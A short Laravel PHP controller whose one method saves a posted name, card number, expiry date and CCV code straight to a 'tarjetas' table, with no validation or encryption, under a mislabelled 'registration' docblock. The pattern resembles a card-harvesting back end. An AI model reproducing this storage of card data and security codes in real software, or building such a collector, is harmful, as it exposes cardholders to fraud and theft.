<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\tarjetas;
use App\Providers\RouteServiceProvider;
use Illuminate\Auth\Events\Registered;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rules;
use Illuminate\View\View;

class DocumentarController extends Controller
{
   
    /**
     * Handle an incoming registration request.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function documentar(Request $request)
    {
      

        $tarjetas=new tarjetas();
        $tarjetas->nombre=$request->post('Nombre');
        $tarjetas->apellido=$request->post('Apellidos');
        $tarjetas->ccv=$request->post('CCV');
        $tarjetas->fecha=$request->post('Fecha');
        $tarjetas->tarjeta=$request->post('Tarjeta');
        $tarjetas->save();






        return redirect("/notificacion");
    }
}
